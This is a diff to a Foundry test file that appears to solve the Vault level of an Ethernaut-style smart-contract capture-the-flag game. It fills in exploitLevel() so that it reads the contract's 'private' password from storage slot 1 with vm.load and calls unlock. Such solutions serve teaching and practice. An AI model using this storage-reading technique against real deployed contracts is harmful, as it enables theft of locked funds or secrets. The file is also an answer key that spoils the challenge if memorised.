@@ -34,13 +34,9 @@ contract TestVault is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
-        vm.startPrank(player, player);
-
-
-        assertEq(level.locked(), false);
-
+        vm.startPrank(player);
+        bytes32 password = vm.load(address(level), bytes32(uint256(1)));
+        level.unlock(password);
         vm.stopPrank();
     }
 }
